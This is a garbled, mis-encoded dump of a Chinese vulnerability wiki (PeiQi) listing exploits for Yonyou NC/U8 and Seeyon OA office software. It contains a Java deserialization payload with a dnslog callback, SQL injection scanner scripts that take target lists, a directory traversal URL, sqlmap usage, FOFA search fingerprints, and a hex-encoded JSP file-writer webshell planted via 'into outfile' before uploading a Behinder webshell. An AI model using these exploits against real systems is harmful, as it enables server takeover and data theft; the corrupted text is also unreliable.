·ä¸€ä¸ªservletï¼Œå³å­˜åœ¨ååºåˆ—åŒ–çš„readObjectï¼Œåˆå°†é”™è¯¯ä¿¡æ¯å†™å…¥åˆ°responseä¸­ ä¸éš¾çœ‹å‡º uploadServlet å°±å¾ˆæ»¡è¶³è¿™ä¸ªéœ€æ±‚ã€‚ out = new ObjectOutputStream(output); in = new ObjectInputStream(request.getInputStream()); String dsName = (String)in.readObject(); } } catch (Exception var14) { var14.printStackTrace(); if (out == null) { throw new ServletException(var14); } out.writeObject(var14); å¦‚æœå‡ºé”™çš„è¯ï¼Œå°†é”™è¯¯ä¿¡æ¯é€šè¿‡åºåˆ—åŒ–å†™å…¥åˆ°responseä¸­ã€‚å¥½å¤„åœ¨äºï¼Œæˆ‘ä»¬ä¸éœ€è¦éº»çƒ¦çš„å»æ‰¾tomcatçš„responseå¯¹è±¡ã€‚ æ‰€ä»¥ï¼Œæˆ‘ä»¬å°†ååºåˆ—åŒ–çš„payloadï¼Œå‘é€ç»™uploadServletå³å¯ã€‚ç„¶åæˆ‘ä»¬åªéœ€è¦è¯»å–å“åº”ï¼Œå³å¯æ‹¿åˆ°æœåŠ¡å™¨å‘½ä»¤æ‰§è¡Œçš„å›æ˜¾ç»“æœã€‚å®¢æˆ·ç«¯ä»£ç å¯ä»¥è¿™æ ·å†™ ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(r)); Exception e = (Exception) objectInputStream.readObject(); Object obj = e.getCause(); Field targetF = obj.getClass().getDeclaredField(\"target\"); targetF.setAccessible(true); obj = targetF.get(obj); Field msgF = obj.getClass().getSuperclass().getDeclaredField(\"detailMessage\"); msgF.setAccessible(true); String msg = msgF.get(obj).toString(); System.out.println(msg); å‚è€ƒæ–‡ç«  https://mp.weixin.qq.com/s/IdXYbjNVGVIasuwQH48Q1w PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:41 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/ç”¨å‹OA/ç”¨å‹ NC XbrlPersistenceServletååºåˆ—åŒ–.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/ç”¨å‹OA/ç”¨å‹ NC XbrlPersistenceServletååºåˆ—åŒ–.html","title":"ç”¨å‹ NC XbrlPersistenceServletååºåˆ—åŒ–","keywords":"","body":"ç”¨å‹ NC XbrlPersistenceServletååºåˆ—åŒ– æ¼æ´æè¿° ç”¨å‹ NC XbrlPersistenceServletååºåˆ—åŒ–æ¼æ´ æ¼æ´å½±å“ [!NOTE] ç”¨å‹NC æ¼æ´å¤ç° æ”»å‡»é˜Ÿåˆ©ç”¨ç”¨å‹ncååºåˆ—åˆ©ç”¨ ç›®å‰æµ‹è¯•å½±å“ç‰ˆæœ¬ï¼šnc6.5 æ¼æ´urlä¸ºï¼š /service/~xbrl/XbrlPersistenceServlet pocï¼š import requests import threadpool import urllib3 import sys import base64 ip = \"\" dnslog = \"\\x79\\x37\\x64\\x70\\\" #dnslogæŠŠå­—ç¬¦ä¸²è½¬16è¿›åˆ¶æ›¿æ¢è¯¥æ®µï¼Œæµ‹è¯•ç”¨çš„ceye.ioå¯ä»¥å›æ˜¾ data = \"\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x11\\x6a\\x61\\x76\\x61\\x2e\\x75\\x74\\x69\\x6c\\x2e\\x48\\x61\\x73\\x68\\x4d\\x61\\x70\\x05\\x07\\xda\\xc1\\xc3\\x16\\x60\\xd1\\x03\\x00\\x02\\x46\\x00\\x0a\\x6c\\x6f\\x61\\x64\\x46\\x61\\x63\\x74\\x6f\\x72\\x49\\x00\\x09\\x74\\x68\\x72\\x65\\x73\\x68\\x6f\\x6c\\x64\\x78\\x70\\x3f\\x40\\x00\\x00\\x00\\x00\\x00\\x0c\\x77\\x08\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x01\\x73\\x72\\x00\\x0c\\x6a\\x61\\x76\\x61\\x2e\\x6e\\x65\\x74\\x2e\\x55\\x52\\x4c\\x96\\x25\\x37\\x36\\x1a\\xfc\\xe4\\x72\\x03\\x00\\x07\\x49\\x00\\x08\\x68\\x61\\x73\\x68\\x43\\x6f\\x64\\x65\\x49\\x00\\x04\\x70\\x6f\\x72\\x74\\x4c\\x00\\x09\\x61\\x75\\x74\\x68\\x6f\\x72\\x69\\x74\\x79\\x74\\x00\\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x4c\\x00\\x04\\x66\\x69\\x6c\\x65\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x04\\x68\\x6f\\x73\\x74\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x08\\x70\\x72\\x6f\\x74\\x6f\\x63\\x6f\\x6c\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x03\\x72\\x65\\x66\\x71\\x00\\x7e\\x00\\x03\\x78\\x70\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x50\\x74\\x00\\x11\"+dnslog+\"\\x3a\\x38\\x30\\x74\\x00\\x00\\x74\\x00\\x0e\"+dnslog+\"\\x74\\x00\\x04\\x68\\x74\\x74\\x70\\x70\\x78\\x74\\x00\\x18\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\"+dnslog+\"\\x3a\\x38\\x30\\x78\" uploadHeader={\"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36\"} req = requests.post(\"http://+\"ip\"+/service/~xbrl/XbrlPersistenceServlet\", headers=uploadHeader, verify=False, data=data, timeout=25) print (req.text) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-04-09 15:35:37 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/ç”¨å‹OA/ç”¨å‹ NC bsh.servlet.BshServlet è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/ç”¨å‹OA/ç”¨å‹ NC bsh.servlet.BshServlet è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html","title":"ç”¨å‹ NC bsh.servlet.BshServlet è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´","keywords":"","body":"ç”¨å‹ NC bsh.servlet.BshServlet è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ æ¼æ´æè¿° ç”¨å‹ NC bsh.servlet.BshServlet å­˜åœ¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œé€šè¿‡BeanShell æ‰§è¡Œè¿œç¨‹å‘½ä»¤è·å–æœåŠ¡å™¨æƒé™ æ¼æ´å½±å“ [!NOTE] ç”¨å‹ NC FOFA [!NOTE] icon_hash=\"1085941792\" æ¼æ´å¤ç° è®¿é—®é¡µé¢å¦‚ä¸‹ æ¼æ´Urlä¸º /servlet/~ic/bsh.servlet.BshServlet PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-01 20:46:24 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/ç”¨å‹OA/ç”¨å‹ERP-NC ç›®å½•éå†æ¼æ´.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/ç”¨å‹OA/ç”¨å‹ERP-NC ç›®å½•éå†æ¼æ´.html","title":"ç”¨å‹ERP-NC ç›®å½•éå†æ¼æ´","keywords":"","body":"ç”¨å‹ERP-NC ç›®å½•éå†æ¼æ´ æ¼æ´æè¿° ç”¨å‹ERP-NC å­˜åœ¨ç›®å½•éå†æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ç›®å½•éå†è·å–æ•æ„Ÿæ–‡ä»¶ä¿¡æ¯ æ¼æ´å½±å“ [!NOTE] ç”¨å‹ERP-NC FOFA [!NOTE] app=\"ç”¨å‹-UFIDA-NC\" æ¼æ´å¤ç° POCä¸º /NCFindWeb?service=IPreAlertConfigService&filename= æŸ¥çœ‹ ncwslogin.jsp æ–‡ä»¶ Goby & POC [!NOTE] YongYou ERP-NC directory traversal PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:41 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/ç”¨å‹OA/ç”¨å‹ U8 OA test.jsp SQLæ³¨å…¥æ¼æ´.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/ç”¨å‹OA/ç”¨å‹ U8 OA test.jsp SQLæ³¨å…¥æ¼æ´.html","title":"ç”¨å‹ U8 OA test.jsp SQLæ³¨å…¥æ¼æ´","keywords":"","body":"ç”¨å‹ U8 OA test.jsp SQLæ³¨å…¥æ¼æ´ æ¼æ´æè¿° ç”¨å‹ U8 OA test.jspæ–‡ä»¶å­˜åœ¨ SQLæ³¨å…¥æ¼æ´ï¼Œç”±äºä¸è‡´è¿œOAä½¿ç”¨ç›¸åŒçš„æ–‡ä»¶ï¼Œäºæ˜¯å­˜åœ¨äº†åŒæ ·çš„æ¼æ´ æ¼æ´å½±å“ [!NOTE] ç”¨å‹ U8 OA FOFA [!NOTE] \"ç”¨å‹U8-OA\" æ¼æ´å¤ç° å¯å‚è€ƒ æ–‡ç«  è‡´è¿œOA A6 test.jsp SQLæ³¨å…¥æ¼æ´ ç™»å½•é¡µé¢å¦‚ä¸‹ POC /yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1)) åˆ©ç”¨æ–¹æ³•ä¸è‡´è¿œOA çš„SQLæ³¨å…¥ç±»ä¼¼ æ¼æ´POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mTitle : ç”¨å‹ U8 OA test.jsp SQLæ³¨å…¥æ¼æ´ \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mFile >>> ip.txt \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5(1))\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if \"c4ca4238a0b923820dcc509a6f75849b\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ç›®æ ‡ {}å­˜åœ¨æ¼æ´ \\n[o] å“åº”åœ°å€: {} \\033[0m\".format(target_url, vuln_url)) else: print(\"\\033[31m[x] ç›®æ ‡ {}ä¸å­˜åœ¨æ¼æ´ \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] ç›®æ ‡ {} è¯·æ±‚å¤±è´¥ \\033[0m\".format(target_url)) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:41 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/ç”¨å‹OA/ç”¨å‹ NCCloud FSæ–‡ä»¶ç®¡ç†SQLæ³¨å…¥.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/ç”¨å‹OA/ç”¨å‹ NCCloud FSæ–‡ä»¶ç®¡ç†SQLæ³¨å…¥.html","title":"ç”¨å‹ NCCloud FSæ–‡ä»¶ç®¡ç†SQLæ³¨å…¥","keywords":"","body":"ç”¨å‹ NCCloud FSæ–‡ä»¶ç®¡ç†SQLæ³¨å…¥ æ¼æ´æè¿° ç”¨å‹ NCCloud FSæ–‡ä»¶ç®¡ç†ç™»å½•é¡µé¢å¯¹ç”¨æˆ·åå‚æ•°æ²¡æœ‰è¿‡æ»¤ï¼Œå­˜åœ¨SQLæ³¨å…¥ æ¼æ´å½±å“ [!NOTE] ç”¨å‹ NCCloud FOFA [!NOTE] \"NCCloud\" æ¼æ´æè¿° ç™»å½•é¡µé¢å¦‚ä¸‹ åœ¨åº”ç”¨ä¸­å­˜åœ¨æ–‡ä»¶æœåŠ¡å™¨ç®¡ç†ç™»å½•é¡µé¢ http://xxx.xxx.xxx.xxx/fs/ ç™»å½•è¯·æ±‚åŒ…å¦‚ä¸‹ GET /fs/console?username=123&password=%2F7Go4Iv2Xqlml0WjkQvrvzX%2FgBopF8XnfWPUk69fZs0%3D HTTP/1.1 Host: xxx.xxx.xxx.xxx Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: JSESSIONID=2CF7A25EE7F77A064A9DA55456B6994D.server; JSESSIONID=0F83D6A0F3D65B8CD4C26DFEE4FCBC3C.server Connection: close ä½¿ç”¨Sqlmapå¯¹usernameå‚æ•° è¿›è¡ŒSQLæ³¨å…¥ sqlmap -r sql.txt -p username PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:41 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/è‡´è¿œOA/":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/è‡´è¿œOA/","title":"è‡´è¿œOA","keywords":"","body":"è‡´è¿œOA è‡´è¿œOA A6 createMysql.jsp æ•°æ®åº“æ•æ„Ÿä¿¡æ¯æ³„éœ² è‡´è¿œOA A6 DownExcelBeanServlet ç”¨æˆ·æ•æ„Ÿä¿¡æ¯æ³„éœ² è‡´è¿œOA A6 initDataAssess.jsp ç”¨æˆ·æ•æ„Ÿä¿¡æ¯æ³„éœ² è‡´è¿œOA A6 test.jsp SQLæ³¨å…¥æ¼æ´ è‡´è¿œOA A8 htmlofficeservlet RCEæ¼æ´ è‡´è¿œOA getSessionList.jsp Sessionæ³„æ¼æ¼æ´ è‡´è¿œOA ajax.do ç™»å½•ç»•è¿‡ ä»»æ„æ–‡ä»¶ä¸Šä¼  CNVD-2021-01627 è‡´è¿œOA webmail.doä»»æ„æ–‡ä»¶ä¸‹è½½ CNVD-2020-62422 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-03-20 22:10:35 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/è‡´è¿œOA/è‡´è¿œOA A6 createMysql.jsp æ•°æ®åº“æ•æ„Ÿä¿¡æ¯æ³„éœ².html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/è‡´è¿œOA/è‡´è¿œOA A6 createMysql.jsp æ•°æ®åº“æ•æ„Ÿä¿¡æ¯æ³„éœ².html","title":"è‡´è¿œOA A6 createMysql.jsp æ•°æ®åº“æ•æ„Ÿä¿¡æ¯æ³„éœ²","keywords":"","body":"è‡´è¿œOA A6 createMysql.jsp æ•°æ®åº“æ•æ„Ÿä¿¡æ¯æ³„éœ² æ¼æ´æè¿° è‡´è¿œOA A6 å­˜åœ¨æ•°æ®åº“æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡è®¿é—®ç‰¹å®šçš„URLè·å–æ•°æ®åº“è´¦æˆ·ä»¥åŠå¯†ç  MD5 æ¼æ´å½±å“ [!NOTE] è‡´è¿œOA A6 FOFA [!NOTE] title=\"è‡´è¿œA8+ååŒç®¡ç†è½¯ä»¶.A6\" æ¼æ´å¤ç° å½“è®¿é—®å¦‚ä¸‹URLæ—¶æ‰§è¡Œäº†SQLè¯­å¥ select * from mysql.user; è¿›è¡ŒæŸ¥è¯¢å¹¶è¿”å›åˆ°é¡µé¢ä¸­ /yyoa/createMysql.jsp /yyoa/ext/createMysql.jsp æ¼æ´åˆ©ç”¨POC import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: è‡´è¿œOA A6 \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/yyoa/createMysql.jsp\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] æ­£åœ¨è¯·æ±‚ {}/yyoa/createMysql.jsp..... \\033[0m\".format(target_url)) if 'root' in response.text and response.status_code == 200: print(\"\\033[36m[o] å“åº”ä¸º:{}\\n \\033[0m\".format(response.text)) else: print(\"\\033[31m[x] ç›®æ ‡ {} ä¸Šä¼ Webshellæ–‡ä»¶å¤±è´¥\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] å·²ä¸Šä¼  https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ç›®å½•ä¸­ Seeyon_OA_A6__Disclosure_of_database_sensitive_information PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:41 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/è‡´è¿œOA/è‡´è¿œOA A6 DownExcelBeanServlet ç”¨æˆ·æ•æ„Ÿä¿¡æ¯æ³„éœ².html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/è‡´è¿œOA/è‡´è¿œOA A6 DownExcelBeanServlet ç”¨æˆ·æ•æ„Ÿä¿¡æ¯æ³„éœ².html","title":"è‡´è¿œOA A6 DownExcelBeanServlet ç”¨æˆ·æ•æ„Ÿä¿¡æ¯æ³„éœ²","keywords":"","body":"è‡´è¿œOA A6 DownExcelBeanServlet ç”¨æˆ·æ•æ„Ÿä¿¡æ¯æ³„éœ² æ¼æ´æè¿° è‡´è¿œOA A6 å­˜åœ¨æŸä¸ªæœªæˆæƒçš„æ¥å£å¯¼è‡´ä»»æ„è®¿é—®è€…å¯ä¸‹è½½OAä¸­çš„ç”¨æˆ·ä¿¡æ¯ æ¼æ´å½±å“ [!NOTE] è‡´è¿œOA A6 FOFA [!NOTE] title=\"è‡´è¿œA8+ååŒç®¡ç†è½¯ä»¶.A6\" æ¼æ´å¤ç° è®¿é—®å¦‚ä¸‹URLå³å¯è·³è½¬ä¸‹è½½ç”¨æˆ·ä¿¡æ¯æ–‡ä»¶ http://xxx.xxx.xxx.xxx/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0 å¯ä»¥å†åˆ©ç”¨å¾—åˆ°çš„ç”¨æˆ·åä½¿ç”¨å¼±å£ä»¤çˆ†ç ´è¿›å…¥OAè¿›ä¸€æ­¥æ”»å‡» æ¼æ´åˆ©ç”¨POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: è‡´è¿œOA A6 \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mFile >>> ip.txt \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if \"@\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ç›®æ ‡ {}å­˜åœ¨æ¼æ´,ä¸‹è½½åœ°å€:{} \\033[0m\".format(target_url, vuln_url)) else: print(\"\\033[31m[x] ç›®æ ‡ {}ä¸å­˜åœ¨æ¼æ´ \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) def Scan(file_name): with open(file_name, \"r\", encoding='utf8') as scan_url: for url in scan_url: if url[:4] != \"http\": url = \"http://\" + url url = url.strip('\\n') try: POC_1(url) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚æŠ¥é”™ \\033[0m\".format(e)) continue if __name__ == '__main__': title() file_name = str(input(\"\\033[35mPlease input Attack File\\nFile >>> \\033[0m\")) Scan(file_name) Goby & POC [!NOTE] å·²ä¸Šä¼  https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ç›®å½•ä¸­ Seeyon_OA_A6_DownExcelBeanServlet_User_information_leakage PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:41 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/è‡´è¿œOA/è‡´è¿œOA A6 initDataAssess.jsp ç”¨æˆ·æ•æ„Ÿä¿¡æ¯æ³„éœ².html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/è‡´è¿œOA/è‡´è¿œOA A6 initDataAssess.jsp ç”¨æˆ·æ•æ„Ÿä¿¡æ¯æ³„éœ².html","title":"è‡´è¿œOA A6 initDataAssess.jsp ç”¨æˆ·æ•æ„Ÿä¿¡æ¯æ³„éœ²","keywords":"","body":"è‡´è¿œOA A6 initDataAssess.jsp ç”¨æˆ·æ•æ„Ÿä¿¡æ¯æ³„éœ² æ¼æ´æè¿° è‡´è¿œOA A6 initDataAssess.jsp å­˜åœ¨ç”¨æˆ·æ•æ„Ÿä¿¡æ¯æ³„éœ² å¯ä»¥é€šè¿‡å¾—åˆ°çš„ç”¨æˆ·åçˆ†ç ´ç”¨æˆ·å¯†ç è¿›å…¥åå°è¿›ä¸€æ­¥æ”»å‡» æ¼æ´å½±å“ [!NOTE] è‡´è¿œOA A6 FOFA [!NOTE] title=\"è‡´è¿œA8+ååŒç®¡ç†è½¯ä»¶.A6\" æ¼æ´å¤ç° è®¿é—®ä¸‹åˆ—URLæ³„éœ²ç”¨æˆ·ä¿¡æ¯ http://xxx.xxx.xxx.xxx/yyoa/assess/js/initDataAssess.jsp æ¼æ´åˆ©ç”¨POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: è‡´è¿œOA A6 \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mFile >>> ip.txt \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/yyoa/assess/js/initDataAssess.jsp\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if \"/yyoa/index.jsp\" not in response.text and \"personList\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ç›®æ ‡ {}å­˜åœ¨æ¼æ´,æ³„éœ²åœ°å€:{} \\033[0m\".format(target_url, vuln_url)) else: print(\"\\033[31m[x] ç›®æ ‡ {}ä¸å­˜åœ¨æ¼æ´ \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\") def Scan(file_name): with open(file_name, \"r\", encoding='utf8') as scan_url: for url in scan_url: if url[:4] != \"http\": url = \"http://\" + url url = url.strip('\\n') try: POC_1(url) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚æŠ¥é”™ \\033[0m\") continue if __name__ == '__main__': title() file_name = str(input(\"\\033[35mPlease input Attack File\\nFile >>> \\033[0m\")) Scan(file_name) Goby & POC [!NOTE] å·²ä¸Šä¼  https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ç›®å½•ä¸­ Seeyon_OA_A6_initDataAssess.jsp_User_information_leakage PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:41 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/è‡´è¿œOA/è‡´è¿œOA A6 test.jsp SQLæ³¨å…¥æ¼æ´.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/è‡´è¿œOA/è‡´è¿œOA A6 test.jsp SQLæ³¨å…¥æ¼æ´.html","title":"è‡´è¿œOA A6 test.jsp SQLæ³¨å…¥æ¼æ´","keywords":"","body":"è‡´è¿œOA A6 test.jsp SQLæ³¨å…¥æ¼æ´ æ¼æ´æè¿° è‡´è¿œOA A6 test.jsp å­˜åœ¨sqlæ³¨å…¥æ¼æ´ï¼Œå¹¶å¯ä»¥é€šè¿‡æ³¨å…¥å†™å…¥webshellæ–‡ä»¶æ§åˆ¶æœåŠ¡å™¨ æ¼æ´å½±å“ [!NOTE] è‡´è¿œOA A6 FOFA [!NOTE] title=\"è‡´è¿œA8+ååŒç®¡ç†è½¯ä»¶.A6\" æ¼æ´å¤ç° è®¿é—®URL http://xxx.xxx.xxx.xxx/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20database()) è¿”å›äº†å½“å‰ä½¿ç”¨çš„æ•°æ®åº“ è¦æƒ³å†™å…¥shelléœ€è¦çŸ¥é“å†™å…¥çš„è·¯å¾„ è¿™é‡Œå¾—åˆ°è·¯å¾„ D:\\Program Files\\UFseeyon\\OA\\mysql\\bin..\\ é€šè¿‡ into outfile å†™å…¥æ–‡ä»¶ï¼Œè¿™é‡Œå› ä¸º jspæœ¨é©¬å­˜åœ¨ç‰¹æ®Šç¬¦å·ï¼Œä½¿ç”¨ hexç¼–ç  ä¸Šä¼ å…è®¸æ–‡ä»¶ä¸Šä¼ çš„jspæ–‡ä»¶ HEXç¼–ç  3C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C5C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E http://xxx.xxx.xxx.xxx/yyoa/common/js/menu/test.jsp?doType=101&S1=select%20unhex(%273C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E%27)%20%20into%20outfile%20%27E:/Program Files/UFseeyon/OA/tomcat/webapps/yyoa/test_upload.jsp%27 æ˜¾ç¤ºä¸Šå›¾åˆ™ä¸Šä¼ æˆåŠŸï¼Œè®¿é—® test_upload.jsp ä¸ºç©ºç™½ä¸æŠ¥é”™é¡µé¢ä¸å­˜åœ¨å°±æ˜¯ä¸Šä¼ æˆåŠŸ åœ¨å‘é€è¯·æ±‚åŒ…ä¸Šä¼ webshellï¼Œè¿™é‡Œä¸Šä¼ å†°è [!NOTE] æ³¨æ„ä¸Šä¼ çš„webshelléœ€è¦urlç¼–ç ä¸€ä¸‹ http://xxx.xxx.xxx.xxx/yyoa/peiqi_upload.jsp?f=testwebshell.jsp 